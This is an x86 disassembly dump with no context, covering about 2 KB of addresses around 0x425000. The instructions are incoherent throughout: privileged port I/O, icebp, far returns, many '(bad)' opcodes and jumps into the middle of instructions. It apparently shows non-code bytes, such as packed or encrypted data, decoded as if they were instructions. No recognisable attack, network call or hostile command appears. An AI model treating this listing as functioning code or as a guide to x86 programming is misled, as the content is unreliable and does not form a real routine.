  424e97:	je     0x424ee9
  424e99:	xchg   edx,eax
  424e9a:	adc    eax,0xed2d7780
  424e9f:	sub    eax,0xf7777c8d
  424ea4:	cmp    cl,BYTE PTR [ebp-0x18127273]
  424eaa:	test   DWORD PTR [ebp-0x5bacf329],0xc4a37480
  424eb4:	or     al,0x53
  424eb6:	push   0xffffffab
  424eb8:	test   eax,0x8d25fb70
  424ebd:	xchg   edi,eax
  424ebe:	add    BYTE PTR [edi+0x5c099696],0x92
  424ec5:	adc    eax,0x1def7501
  424eca:	or     DWORD PTR [edi+edi*2+0x6f],ebx
  424ece:	xchg   ebx,eax
  424ecf:	fwait
  424ed0:	jl     0x424f49
  424ed2:	mov    dh,dh
  424ed4:	and    al,0x6f
  424ed6:	cmp    BYTE PTR [eax-0x10],dl
  424ed9:	mov    ecx,DWORD PTR [edi+0x70]
  424edc:	aad    0xb5
  424ede:	icebp  
  424edf:	and    ah,BYTE PTR [edi+ebp*2]
  424ee2:	cmp    BYTE PTR [eax-0x187fde83],al
  424ee8:	out    dx,eax
  424ee9:	in     al,dx
  424eea:	retf   
  424eeb:	pop    edi
  424eec:	out    0x21,eax
  424eee:	in     al,0xcf
  424ef0:	sbb    ch,0xef
  424ef3:	in     al,dx
  424ef4:	retf   
  424ef5:	in     al,dx
  424ef6:	out    0xef,eax
  424ef8:	pop    edi
  424ef9:	out    0x21,eax
  424efb:	in     al,0x7b
  424efd:	xor    al,0x8a
  424f00:	and    bh,0x8a
  424f03:	push   ebx
  424f04:	(bad)  
  424f05:	in     eax,dx
  424f06:	dec    ebx
  424f07:	or     eax,0x8029bcb2
  424f0c:	mov    al,ds:0xff0cc4b2
  424f11:	push   es
  424f12:	in     eax,dx
  424f13:	mov    edx,0xeeb2ed8a
  424f18:	in     eax,dx
  424f19:	push   0x3d
  424f1b:	jnp    0x424ecf
  424f1d:	popa   
  424f1e:	sub    edi,edi
  424f20:	retf   
  424f21:	mov    ds:0x6f24f64b,al
  424f26:	cmp    BYTE PTR [edx],bh
  424f28:	out    0x8a,eax
  424f2a:	xor    al,0x8a
  424f2d:	and    bh,0x8a
  424f30:	push   ebx
  424f31:	(bad)  
  424f32:	in     eax,dx
  424f33:	dec    ebx
  424f34:	or     eax,0xb20cbeb2
  424f39:	mov    esp,0x632aff29
  424f3e:	lock mov esp,esp
  424f41:	dec    edx
  424f42:	push   ebx
  424f43:	push   0xffffffab
  424f45:	mov    ds:0x8deffb70,eax
  424f4a:	xchg   edi,eax
  424f4b:	add    BYTE PTR [edi+0x7c8187ed],0x77
  424f52:	cmp    DWORD PTR [ebx+0x7c8d8dad],0x77
  424f59:	stc    
  424f5a:	in     al,dx
  424f5b:	ror    DWORD PTR [ebp-0x7b888373],0x14
  424f62:	ror    BYTE PTR [ebp-0x74888373],cl
  424f68:	call   0x8a77:0x7c8dee71
  424f6f:	stc    
  424f70:	lods   eax,DWORD PTR ds:[esi]
  424f71:	lea    ecx,[ebp-0x5088884]
  424f77:	dec    DWORD PTR [ebp+0x7a777c8d]
  424f7d:	dec    ebx
  424f7e:	aam    0x8d
  424f80:	lea    edi,[edi+esi*2-0x7e]
  424f84:	in     al,dx
  424f85:	lea    ecx,[ebp-0x79888373]
  424f8b:	mov    dl,0xb9
  424f8d:	lea    ecx,[ebp-0x7f788884]
  424f93:	xchg   esi,eax
  424f94:	lea    ecx,[ebp+0x332777c]
  424f9a:	mov    bh,0x8d
  424f9c:	lea    eax,[eax-0x73a17510]
  424fa2:	fimul  DWORD PTR [ebp-0x7f4dbc73]
  424fa8:	lock mov edx,DWORD PTR [ebx+0x72]
  424fac:	dec    ebx
  424fad:	add    eax,0xfd809b99
  424fb2:	mov    ds:0x8d90f1ba,al
  424fb7:	lea    esp,[edx-0x7238d090]
  424fbd:	lea    esp,[edx-0x725a2bfb]
  424fc3:	lea    esp,[edx-0x72c2204e]
  424fc9:	lea    edi,[edi+esi*2-0x38]
  424fcd:	div    eax
  424fcf:	lea    ecx,[ebp-0x24758884]
  424fd5:	aad    0x8d
  424fd7:	lea    edi,[edi+esi*2-0x75]
  424fdb:	sbb    DWORD PTR [ecx-0x73],esi
  424fde:	lea    eax,[eax-0x687f7489]
  424fe4:	mov    dh,BYTE PTR [edi]
  424fe6:	dec    ecx
  424fe7:	popf   
  424fe8:	lea    ecx,[ebp+0x77ecfb53]
  424fee:	enter  0xb680,0x57
  424ff2:	jnp    0x425001
  424ff4:	lea    ecx,[ebp-0x68af08bd]
  424ffa:	mov    al,BYTE PTR [eax+0x77ec8a77]
  425000:	out    dx,eax
  425001:	adc    BYTE PTR [edi+0x2197ec8a],0x8f
  425008:	nop
  425009:	adc    BYTE PTR [ecx-0x80],dh
  42500c:	ja     0x425040
  42500e:	adc    BYTE PTR [edi-0x76e6c879],0x8d
  425015:	lea    edx,[ebx-0x5]
  425018:	adc    BYTE PTR [edi-0xe04007a],0x3
  42501f:	(bad)  [ebp-0x7f08bc73]
  425025:	ja     0x425020
  425027:	in     al,dx
  425028:	(bad)  
  425029:	icebp  
  42502a:	test   al,0x55
  42502c:	lea    ecx,[ebp-0x681308bd]
  425032:	test   BYTE PTR [eax-0x287f7c89],al
  425038:	jno    0x424fba
  42503a:	out    0x82,eax
  42503c:	mov    ds:0x8d9630c2,al
  425041:	lea    esi,[ebx]
  425043:	test   DWORD PTR [eax-0x3d5d8589],0x8d8d2db7
  42504d:	inc    ebx
  42504e:	ret    0x7253
  425051:	dec    ebx
  425052:	dec    ebx
  425053:	adc    BYTE PTR [edi+0x1fe757f7],0x8d
  42505a:	lea    esi,[ebx]
  42505c:	sti    
  42505d:	xor    BYTE PTR [esi+0x7a2f743],0x4c
  425064:	fmul   DWORD PTR [ebp+0x97e638d]
  42506a:	dec    esp
  42506b:	mov    ds:0xab4d4d4d,eax
  425070:	test   eax,0x8d21fb70
  425075:	xchg   edi,eax
  425076:	add    BYTE PTR [edi-0x6c8a7813],0x99
  42507d:	fwait
  42507e:	jl     0x4250f7
  425080:	xchg   DWORD PTR [ebx+eiz*2+0x777c8d8d],ebx
  425087:	xor    dl,al
  425089:	jg     0x425018
  42508b:	lea    edi,[edi+esi*2-0x38]
  42508f:	pusha  
  425090:	xchg   esi,eax
  425091:	lea    ecx,[ebp-0x15748884]
  425097:	xchg   esi,eax
  425098:	lea    ecx,[ebp-0xd758884]
  42509e:	sub    eax,0x777c8d8d
  4250a3:	sbb    ecx,0x59
  4250a6:	lea    ecx,[ebp+0x7784777c]
  4250ac:	out    dx,al
  4250ad:	lea    ecx,[ebp+0x6df9777c]
  4250b3:	xor    DWORD PTR [ebp-0x79888373],ecx
  4250b9:	sbb    ebx,DWORD PTR [edi-0x73]
  4250bc:	lea    edi,[edi+esi*2+0x66]
  4250c0:	pop    esp
  4250c1:	leave  
  4250c2:	lea    ecx,[ebp-0x59958884]
  4250c8:	lea    ecx,[ebp+0x76777c8d]
  4250ce:	iret   
  4250cf:	cmp    DWORD PTR [ebp-0x2888373],ecx
  4250d5:	and    BYTE PTR [ecx],ch
  4250d7:	lea    ecx,[ebp+0x5caf777c]
  4250dd:	iret   
  4250de:	lea    ecx,[ebp-0x1a088884]
  4250e4:	sbb    eax,0x77808d8d
  4250e9:	test   BYTE PTR [eax-0x55307c10],al
  4250ef:	xor    ecx,DWORD PTR [ebp-0x58c1b873]
  4250f5:	lea    ecx,[ebp-0x72dcdf31]
  4250fb:	lea    ecx,[ecx]
  4250fd:	and    dh,BYTE PTR [edx+0x7f549e60]
  425103:	mov    eax,DWORD PTR [ebx-0x3]
  425106:	xor    BYTE PTR [edi-0x76],0x80
  42510a:	xchg   edi,eax
  42510b:	mov    esi,DWORD PTR [ebx]
  42510d:	sti    
  42510e:	adc    BYTE PTR [edi-0x36b73038],0x8d
  425115:	lea    eax,[ebx-0x5]
  425118:	adc    BYTE PTR [edi-0x7f04bcce],0x97
  42511f:	xchg   edi,edi
  425121:	sti    
  425122:	push   ebx
  425123:	jb     0x42511f
  425125:	pushf  
  425126:	ins    BYTE PTR es:[edi],dx
  425127:	dec    ebp
  425128:	dec    ebp
  425129:	dec    ebx
  42512a:	or     eax,DWORD PTR [eax-0x2f93de69]
  425130:	pop    ds
  425131:	lea    ecx,[ebp+0x7780f743]
  425137:	xchg   BYTE PTR [eax+0x7c43f9d7],al
  42513d:	or     DWORD PTR [edx],esp
  42513f:	cld    
  425140:	cli    
  425141:	mov    al,ds:0xbe309e50
  425146:	icebp  
  425147:	lea    ecx,[ebp+0x7a777c8d]
  42514d:	sbb    al,0x55
  42514f:	lea    ecx,[ebp+0x2e82777c]
  425155:	leave  
  425156:	lea    ecx,[ebp-0x327b8884]
  42515c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42515d:	lea    ecx,[ebp+0x3a83777c]
  425163:	lea    ecx,[ebp-0x7c587f73]
  425169:	push   ebx
  42516a:	jb     0x4251ca
  42516c:	fwait
  42516d:	leave  
  42516e:	lea    ecx,[ebp-0x687f39b5]
  425174:	test   BYTE PTR [eax-0x4001059],al
  42517a:	adc    BYTE PTR [edi-0x7f04bc7e],0x97
  425181:	jp     0x4251ba
  425183:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425184:	or     DWORD PTR [ebp-0x4ddf673],0x59ef0f01
  42518e:	sub    eax,0x77508ade
  425193:	jp     0x425115
  425195:	ja     0x42518e
  425197:	adc    BYTE PTR [edi+0xbc835af],0x7
  42519e:	adc    BYTE PTR [edi+0x4523357a],0x2f
  4251a5:	and    DWORD PTR [esi+ebp*8-0x4f11efb9],edx
  4251ac:	xor    BYTE PTR [edi-0x3],0xcf
  4251b0:	mov    es,edi
  4251b2:	lea    ecx,[ebp-0x7f898814]
  4251b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4251b9:	push   0x53
  4251bb:	jb     0x425208
  4251bd:	mov    BYTE PTR [eax-0x639b9969],0x6c
  4251c4:	dec    ebp
  4251c5:	dec    ebp
  4251c6:	aaa    
  4251c7:	cmp    BYTE PTR [edi-0x73],dl
  4251ca:	lea    eax,[ebx-0x5]
  4251cd:	push   edi
  4251ce:	adc    DWORD PTR [edx+0x4d],ebp
  4251d1:	dec    ebp
  4251d2:	in     al,dx
  4251d3:	std    
  4251d4:	xor    BYTE PTR [edi-0x76],0x80
  4251d8:	xchg   edi,eax
  4251d9:	mov    esi,DWORD PTR [ebx]
  4251db:	sti    
  4251dc:	adc    BYTE PTR [edi-0x36b73038],0x8d
  4251e3:	lea    eax,[ebx-0x5]
  4251e6:	adc    BYTE PTR [edi-0x7f04bcce],0x97
  4251ed:	xchg   edi,edi
  4251ef:	sti    
  4251f0:	push   ebx
  4251f1:	jb     0x42523e
  4251f3:	mov    BYTE PTR [eax-0x8bcde69],0x80
  4251fa:	ja     0x425182
  4251fc:	and    BYTE PTR [edi+0x97c43f9],0x22
  425203:	je     0x425185
  425205:	mov    al,ds:0x4ec8243
  42520a:	arpl   WORD PTR [ebx],ax
  42520c:	or     DWORD PTR [ebp+ebx*2+0x4d],ecx
  425210:	dec    ebp
  425211:	dec    ebp
  425212:	stos   DWORD PTR es:[edi],eax
  425213:	test   eax,0xeffb70a3
  425218:	lea    edx,[edi-0x78127880]
  42521e:	or     bh,BYTE PTR [edi+esi*2+0x62]
  425222:	in     al,0x58
  425224:	fist   WORD PTR [ecx]
  425226:	pop    esi
  425227:	xchg   BYTE PTR [edi+0x77502643],cl
  42522d:	push   esi
  42522e:	jl     0x4252a7
  425230:	pop    esi
  425231:	loop   0x42528b
  425233:	fist   WORD PTR [ecx]
  425235:	push   eax
  425236:	ja     0x42529e
  425238:	jl     0x4252b1
  42523a:	push   0xffffffe6
  42523c:	pop    eax
  42523d:	fist   WORD PTR [ecx]
  42523f:	push   eax
  425240:	ja     0x4252b8
  425242:	xchg   ebx,eax
  425243:	jl     0x4252bc
  425245:	std    
  425246:	rcr    BYTE PTR [eax-0x21],1
  425249:	adc    DWORD PTR [eax+0x77],edx
  42524c:	scas   eax,DWORD PTR es:[edi]
  42524d:	cdq    
  42524e:	fwait
  42524f:	jl     0x4252c8
  425251:	neg    DWORD PTR [ecx+0x5011df58]
  425257:	ja     0x4252d3
  425259:	push   ebx
  42525a:	jb     0x4252af
  42525c:	dec    ebp
  42525d:	pusha  
  42525e:	mul    BYTE PTR [edi+ebp*2]
  425261:	cmp    BYTE PTR [edi+esi*2-0x7e],bh
  425265:	call   0x7b5431c2
  42526a:	push   eax
  42526b:	ja     0x4251f0
  42526d:	xor    BYTE PTR [edx+0x50879750],0xe7
  425274:	stc    
  425275:	add    DWORD PTR [esi+0xd32ed3a],ebx
  42527b:	mov    dl,0x84
  42527d:	sub    edi,edi
  42527f:	sti    
  425280:	add    DWORD PTR [ebp+0x78],esi
  425283:	bound  eax,QWORD PTR [eax-0x11627f8f]
  425289:	or     DWORD PTR [esi+0x3],eax
  42528c:	or     al,0xb2
  42528e:	les    ecx,FWORD PTR [eax+eax*4]
  425291:	sbb    eax,0x53ee6d80
  425296:	push   0xffffffa2
  425298:	ret    0xc7a7
  42529b:	add    al,0xd4
  42529d:	push   edi
  42529f:	push   eax
  4252a0:	xchg   edi,eax
  4252a1:	mov    eax,DWORD PTR [eax+0x6aec8b77]
  4252a7:	mov    dl,0xb4
  4252a9:	sub    DWORD PTR [ebx+0x77],esp
  4252ac:	and    DWORD PTR [ecx],ecx
  4252ae:	into   
  4252af:	lea    ecx,fs:[ebp-0x74887f73]
  4252b6:	in     eax,dx
  4252b7:	mov    bh,0x86
  4252b9:	lea    edx,[eax-0x19]
  4252bc:	xor    al,BYTE PTR [eax+0x6a4f8b77]
  4252c2:	aad    0xb7
  4252c4:	push   ebx
  4252c5:	push   0x50
  4252c7:	out    0xc8,eax
  4252c9:	adc    BYTE PTR [edi-0x10587f7a],0x1
  4252d0:	gs jno 0x425253
  4252d3:	xchg   edi,eax
  4252d4:	out    dx,eax
  4252d5:	in     al,dx
  4252d6:	pushf  
  4252d7:	push   eax
  4252d8:	xchg   edi,eax
  4252d9:	test   BYTE PTR [edi+0x4d971090],cl
  4252df:	adc    BYTE PTR [edi-0x70631375],0x15
  4252e6:	mov    al,0x80
  4252e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4252e9:	test   BYTE PTR [eax],dl
  4252eb:	adc    ecx,DWORD PTR [edi-0x587fb269]
  4252f1:	mov    ebp,esp
  4252f3:	lods   al,BYTE PTR ds:[esi]
  4252f4:	and    bh,0xef
  4252f7:	adc    BYTE PTR ds:0xc8978063,dl
  4252fd:	ins    DWORD PTR es:[edi],dx
  4252fe:	in     eax,dx
  4252ff:	clc    
  425300:	mov    dh,BYTE PTR [edx-0x412d67a]
  425306:	out    dx,al
  425307:	(bad)  
  425308:	sti    
  425309:	push   ebx
  42530a:	mov    dl,0x50
  42530c:	ja     0x4252d6
  42530e:	outs   dx,BYTE PTR ds:[esi]
  42530f:	xlat   BYTE PTR ds:[ebx]
  425310:	enter  0x9780,0xc8
  425314:	in     eax,dx
  425315:	xor    cl,BYTE PTR ds:0xb20c07b2
  42531b:	test   BYTE PTR [ecx],ch
  42531d:	(bad)  
  42531e:	sti    
  42531f:	adc    BYTE PTR [edi-0x1b049c75],0x34
  425326:	push   ebx
  425327:	dec    ebp
  425328:	jnp    0x4252aa
  42532a:	ja     0x42535e
  42532c:	adc    BYTE PTR [edi-0x79587f75],0xed
  425333:	test   BYTE PTR [edx-0x7f0811ff],cl
  425339:	xchg   edi,eax
  42533a:	mov    eax,DWORD PTR [ecx]
  42533c:	adc    eax,0x21a78093
  425341:	mov    dl,0x7
  425343:	sub    edi,edi
  425345:	sti    
  425346:	push   ebx
  425347:	mov    dl,0x50
  425349:	ja     0x42537d
  42534b:	outs   dx,BYTE PTR ds:[esi]
  42534c:	xlat   BYTE PTR ds:[ebx]
  42534d:	xor    al,BYTE PTR [eax+0x32ed3297]
  425353:	or     eax,0xb20c07b2
  425358:	test   BYTE PTR [ecx],ch
  42535a:	(bad)  
  42535b:	sti    
  42535c:	adc    BYTE PTR [edi+0x4372ec8b],0x3
  425363:	push   eax
  425364:	ja     0x4252ec
  425366:	arpl   WORD PTR [ecx+ecx*1+0x4c],si
  42536a:	leave  
  42536b:	dec    ebp
  42536c:	dec    ebp
  42536d:	dec    ebp
  42536e:	xor    BYTE PTR [edi-0x79],0x80
  425372:	xchg   edi,eax
  425373:	stc    
  425374:	in     eax,dx
  425375:	clc    
  425376:	mov    ch,BYTE PTR [ebp-0x13]
  425379:	sti    
  42537a:	out    dx,al
  42537b:	mov    dl,0x86
  42537d:	sub    edi,edi
  42537f:	sti    
  425380:	push   ebx
  425381:	mov    dl,0x80
  425383:	add    BYTE PTR [eax-0x1281ac09],0xc6
  42538a:	or     eax,0x5029b4b2
  42538f:	xchg   edi,eax
  425390:	stc    
  425391:	mov    dl,0x7
  425393:	or     al,0x50
  425395:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425396:	xchg   DWORD PTR [eax],esi
  425398:	xchg   edi,eax
  425399:	xchg   ebp,ebp
  42539b:	out    0x87,eax
  42539d:	outs   dx,DWORD PTR ds:[esi]
  42539e:	or     edx,ebp
  4253a0:	jp     0x4253af
  4253a2:	dec    ebp
  4253a3:	dec    ebp
  4253a4:	stos   DWORD PTR es:[edi],eax
  4253a5:	test   eax,0xeffb70a3
  4253aa:	lea    edx,[edi-0x78127880]
  4253b0:	adc    eax,0x7cef7780
  4253b5:	ja     0x4253e9
  4253b7:	mul    BYTE PTR [edi+ebp*2]
  4253ba:	cmp    BYTE PTR [edi+esi*2-0x76],bh
  4253be:	cmc    
  4253bf:	and    al,0x6f
  4253c1:	cmp    BYTE PTR [eax+0x5099938d],al
  4253c7:	ja     0x425354
  4253c9:	jl     0x425442
  4253cb:	enter  0x24dc,0x6f
  4253cf:	cmp    BYTE PTR [ebx+0x4787777c],bl
  4253d5:	sbb    al,0xf9
  4253d7:	adc    eax,DWORD PTR [eax-0xf7f7529]
  4253dd:	mov    ah,dl
  4253df:	or     eax,0x6f24225e
  4253e4:	cmp    BYTE PTR [ebx-0x454dd5ad],ch
  4253ea:	sub    DWORD PTR [ebx+0x32],edx
  4253ed:	mov    dl,0x88
  4253ef:	or     al,0xff
  4253f1:	add    eax,0x8032f080
  4253f6:	xchg   edi,eax
  4253f7:	xor    dl,BYTE PTR [ebx-0x3]
  4253fa:	push   ebx
  4253fb:	pushf  
  4253fc:	mov    dl,0xbe
  4253fe:	or     al,0xb2
  425400:	clc    
  425401:	sub    edi,edi
  425403:	dec    BYTE PTR [ecx]
  425405:	and    al,BYTE PTR ds:0x8d8d24be
  42540b:	lea    eax,[eax-0x687f7410]
  425411:	mov    edx,DWORD PTR [ebx-0x64]
  425414:	mov    dl,0xf8
  425416:	sub    DWORD PTR [ebx-0x3],edx
  425419:	mov    dl,0xbe
  42541b:	or     al,0xff
  42541d:	inc    BYTE PTR [eax-0x587f7569]
  425423:	mov    dl,BYTE PTR [ebx-0x9]
  425426:	push   ebx
  425427:	lods   al,BYTE PTR ds:[esi]
  425428:	mov    dl,0x7
  42542a:	or     al,0xb2
  42542c:	mov    ah,0x29
  42542e:	call   DWORD PTR [edi+ecx*2-0x74687f02]
  425435:	xor    al,0x8b
  425438:	aad    0x59
  42543a:	push   ebx
  42543b:	sub    dh,BYTE PTR [edx-0x8acd646]
  425441:	mov    dl,0x7
  425443:	or     al,0xff
  425445:	mov    dh,0x80
  425447:	lock mov al,BYTE PTR [eax-0x2ac7559]
  42544e:	push   ebx
  42544f:	lods   al,BYTE PTR ds:[esi]
  425450:	mov    dl,0xbe
  425452:	or     al,0xb2
  425454:	mov    ah,0x29
  425456:	call   DWORD PTR [ecx]
  425458:	xchg   esp,eax
  425459:	pop    es
  42545a:	xor    al,0x87
  42545d:	and    BYTE PTR [edi+0x53fd5387],0xac
  425464:	mov    dl,0xbe
  425466:	or     al,0xb2
  425468:	mov    ah,0x29
  42546a:	call   DWORD PTR [ecx]
  42546c:	push   ebx
  42546d:	mov    dh,0xc4
  42546f:	sub    eax,0xbab22a53
  425474:	sub    DWORD PTR [ebx-0x9],edx
  425477:	mov    dl,0x7
  425479:	or     al,0xff
  42547b:	mov    dh,0x80
  42547d:	lock mov al,BYTE PTR [eax-0x2ac7559]
  425484:	push   ebx
  425485:	lods   al,BYTE PTR ds:[esi]
  425486:	mov    dl,0xbe
  425488:	or     al,0xb2
  42548a:	mov    ah,0x29
  42548c:	call   DWORD PTR [ecx]
  42548e:	xchg   esp,eax
  42548f:	pop    es
  425490:	push   eax
  425491:	xchg   edi,eax
  425492:	mov    eax,DWORD PTR [eax-0x687f7510]
  425498:	mov    dl,BYTE PTR [ebx-0x3]
  42549b:	push   ebx
  42549c:	pushf  
  42549d:	mov    dl,0xbe
  42549f:	or     al,0xb2
  4254a1:	clc    
  4254a2:	sub    edi,edi
  4254a4:	(bad)  
  4254a5:	in     al,dx
  4254a6:	add    eax,0x80c8f080
  4254ab:	xchg   edi,eax
  4254ac:	enter  0x9c53,0x53
  4254b0:	std    
  4254b1:	mov    dl,0xf8
  4254b3:	sub    DWORD PTR [edx-0x100f342],esi
  4254b9:	adc    BYTE PTR [edi-0x75587f76],0x53
  4254c0:	not    DWORD PTR [ebx-0x54]
  4254c3:	mov    dl,0xb4
  4254c5:	sub    DWORD PTR [edx-0x6b00f3f9],esi
  4254cb:	inc    ebx
  4254cc:	(bad)  
  4254cd:	arpl   WORD PTR ds:0x4d5b4c09,ax
  4254d3:	dec    ebp
  4254d4:	dec    ebp
  4254d5:	xor    BYTE PTR [edi-0x75],0x80
  4254d9:	lock out dx,eax
  4254db:	stos   DWORD PTR es:[edi],eax
  4254dc:	test   eax,0x77803a50
  4254e1:	mov    esp,DWORD PTR [ebx-0x72110490]
  4254e7:	xchg   edi,eax
  4254e8:	add    BYTE PTR [edi+0x70539696],0x5f
  4254ef:	lock and ebp,edx
  4254f2:	in     eax,0x5f
  4254f4:	lock out dx,eax
  4254f6:	(bad)  
  4254f8:	(bad)  
  4254f9:	out    dx,al
  4254fa:	outs   dx,BYTE PTR ds:[esi]
  4254fb:	adc    BYTE PTR [edi+0x9],dh
  4254fe:	cld    
  4254ff:	ja     0x4254cd
  425501:	aad    0xfc
  425503:	ja     0x425512
  425505:	sbb    esp,edi
  425507:	ja     0x425556
  425509:	ror    BYTE PTR [ecx],1
  42550b:	loopne 0x425584
  42550d:	dec    ebp
  42550e:	or     eax,esp
  425510:	xchg   edi,eax
  425511:	or     eax,0x8d8d7acf
  425516:	lea    esi,[ebx]
  425518:	sti    
  425519:	or     eax,esp
  42551b:	xchg   edi,eax
  42551c:	int3   
  42551d:	xor    edi,ebx
  42551f:	adc    BYTE PTR [edi-0x7b],dh
  425522:	cld    
  425523:	ja     0x42552b
  425525:	or     eax,0xd48a77fc
  42552a:	cld    
  42552b:	ja     0x42557a
  42552d:	jl     0x42552b
  42552f:	ja     0x42553e
  425531:	sar    esp,cl
  425533:	ja     0x425501
  425535:	push   esp
  425536:	(bad)  
  425537:	ja     0x425505
  425539:	(bad)  
  42553a:	xchg   edi,eax
  42553b:	or     eax,0x978ffba6
  425540:	dec    ebp
  425541:	sar    bl,cl
  425543:	(bad)  
  425544:	xchg   edi,eax
  425545:	mov    cl,BYTE PTR [ebx]
  425547:	pop    es
  425548:	(bad)  
  425549:	xchg   edi,eax
  42554a:	push   es
  42554b:	sar    bl,cl
  42554d:	(bad)  
  42554e:	xchg   edi,eax
  42554f:	test   esi,edx
  425551:	neg    ebx
  425553:	or     DWORD PTR [ecx],ecx
  425555:	loopne 0x4255ce
  425557:	or     DWORD PTR [edi+0x8],eax
  42555a:	lea    ecx,[ebp+0x977108d]
  425560:	div    eax
  425562:	or     DWORD PTR [edi-0x11eff689],ecx
  425568:	outs   dx,BYTE PTR ds:[esi]
  425569:	xchg   edx,eax
  42556a:	arpl   ax,si
  42556c:	out    dx,eax
  42556d:	in     al,0x50
  42556f:	dec    ebp
  425570:	xlat   BYTE PTR ds:[ebx]
  425571:	out    dx,eax
  425572:	cdq    
  425573:	xchg   BYTE PTR [edx-0x76],cl
  425576:	dec    ebp
  425577:	dec    ebp
  425578:	jo     0x425575
  42557a:	out    dx,eax
  42557b:	lea    edx,[edi-0x785d7880]
  425581:	cmp    eax,0x938d8dee
  425586:	cdq    
  425587:	mul    BYTE PTR fs:[edi+ebp*2]
  42558b:	cmp    BYTE PTR [eax-0x59],dl
  42558e:	xor    bh,BYTE PTR [edi+esi*2-0x76]
  425592:	cmc    
  425593:	and    al,0x6f
  425595:	cmp    BYTE PTR [edi+esi*2-0x79],bh
  425599:	imul   BYTE PTR [edi+ebp*2]
  42559c:	cmp    BYTE PTR [edi+esi*2-0x7],bh
  4255a0:	xchg   esi,eax
  4255a1:	mov    ch,0xcb
  4255a3:	scas   al,BYTE PTR es:[edi]
  4255a4:	xor    BYTE PTR [edi+0x32],0x80
  4255a8:	lock xor bl,BYTE PTR [ebx-0x2cfef21e]
  4255af:	cmp    ch,BYTE PTR [ebx+0x2a53fc53]
  4255b5:	mov    dl,0x86
  4255b7:	or     al,0xb2
  4255b9:	mov    edx,0x50b2ff29
  4255be:	ja     0x42554b
  4255c0:	jl     0x425639
  4255c2:	sbb    esp,0x24
  4255c5:	outs   dx,DWORD PTR ds:[esi]
  4255c6:	cmp    BYTE PTR [edi+esi*2-0x7e],bh
  4255ca:	inc    edi
  4255cb:	sbb    al,0xf9
  4255cd:	adc    edi,DWORD PTR [edi+esi*2-0x7c]
  4255d1:	out    dx,eax
  4255d2:	lea    ecx,[ebp-0x7f8f7f73]
  4255d8:	ja     0x425564
  4255da:	xor    al,0x8a
  4255dd:	push   ebx
  4255de:	sub    dh,BYTE PTR [edx-0x3acd646]
  4255e4:	mov    dl,0x86
  4255e6:	or     al,0xff
  4255e8:	mov    dl,0x80
  4255ea:	lock xor al,BYTE PTR [eax+0x51533297]
  4255f1:	push   ebx
  4255f2:	pushf  
  4255f3:	mov    dl,0xbe
  4255f5:	or     al,0xb2
  4255f7:	clc    
  4255f8:	sub    edi,edi
  4255fa:	dec    BYTE PTR [ecx]
  4255fc:	and    dh,BYTE PTR [edx+0x778092c4]
  425602:	enter  0xf080,0xc8
  425606:	mov    dl,0x86
  425608:	sub    DWORD PTR [edx-0x4d00f346],esi
  42560e:	push   ebx
  42560f:	je     0x425661
  425611:	ja     0x42559e
  425613:	add    DWORD PTR [edi-0x75],esi
  425616:	or     al,BYTE PTR [esi+0x4d4dcc1a]
  42561c:	push   eax
  42561d:	ja     0x4255aa
  42561f:	xor    BYTE PTR [edi-0x75],0x80
  425623:	lock enter 0xf50,0x1
  425628:	add    BYTE PTR [esi],0x4d
  42562b:	dec    ebp
  42562c:	xor    BYTE PTR [edi-0x76],0x80
  425630:	lock mov dl,BYTE PTR [ebx-0x4]
  425634:	push   ebx
  425635:	sub    dh,BYTE PTR [edx-0x454df37a]
  42563b:	sub    edi,edi
  42563d:	mov    dl,0xec
  42563f:	ja     0x425609
  425641:	push   eax
  425642:	ja     0x42560c
  425644:	xor    BYTE PTR [edi-0x79],0x80
  425648:	lock xchg DWORD PTR [ebx+0x2a],edx
  42564c:	mov    dl,0xba
  42564e:	sub    DWORD PTR [ebx-0x4],edx
  425651:	mov    dl,0x86
  425653:	or     al,0xff
  425655:	mov    dl,0x80
  425657:	lock mov al,BYTE PTR [eax+0x51538a97]
  42565e:	push   ebx
  42565f:	pushf  
  425660:	mov    dl,0xbe
  425662:	or     al,0xb2
  425664:	clc    
  425665:	sub    edi,edi
  425667:	inc    BYTE PTR [ebx-0x4e]
  42566a:	xor    al,0xc8
  42566d:	arpl   bp,di
  42566f:	fstp   DWORD PTR [edx]
  425671:	xor    BYTE PTR [edi-0x7],0x80
  425675:	lock stc 
  425677:	push   ebx
  425678:	cld    
  425679:	push   ebx
  42567a:	sub    dh,BYTE PTR [edx-0x454df37a]
  425680:	sub    edi,edi
  425682:	mov    dl,0x50
  425684:	ja     0x425611
  425686:	jl     0x4256ff
  425688:	xchg   DWORD PTR [edx-0x7fc790e2],ebp
  42568e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42568f:	mov    esi,0x8d8d8dcd
  425694:	xor    al,0x83
  425697:	xor    BYTE PTR [edi-0x7d],0x53
  42569b:	jl     0x42564f
  42569d:	test   BYTE PTR [ecx],ch
  42569f:	push   ebx
  4256a0:	push   ecx
  4256a1:	mov    dl,0xbe
  4256a3:	or     al,0xff
  4256a5:	std    
  4256a6:	xor    BYTE PTR [edi-0x75],0x94
  4256aa:	xchg   BYTE PTR [eax+0x77],dl
  4256ad:	add    BYTE PTR [eax-0x72701089],0x10
  4256b4:	ja     0x42567a
  4256b6:	(bad)  
  4256b7:	ja     0x42567d
  4256b9:	xor    al,0x8b
  4256bc:	or     eax,esp
  4256be:	push   0x53
  4256c0:	mov    dl,0x50
  4256c2:	ja     0x42568c
  4256c4:	xor    BYTE PTR [edi-0x79],0x80
  4256c8:	lock xchg DWORD PTR [ebx-0x4],edx
  4256cc:	mov    dl,0x86
  4256ce:	or     al,0x53
  4256d0:	sub    dh,BYTE PTR [edx-0x4d00d646]
  4256d6:	xor    al,0xc8
  4256d9:	xor    esi,DWORD PTR [edx-0x7db0f080]
  4256df:	push   es
  4256e0:	dec    ebp
  4256e1:	dec    ebp
  4256e2:	xor    al,0x82
  4256e5:	push   ebx
  4256e6:	mov    dl,0x50
  4256e8:	ja     0x425675
  4256ea:	xor    BYTE PTR [edi-0x76],0x80
  4256ee:	lock mov dl,BYTE PTR [ebx-0x4]
  4256f2:	push   ebx
  4256f3:	sub    dh,BYTE PTR [edx-0x454df37a]
  4256f9:	sub    edi,edi
  4256fb:	mov    dl,0x3a
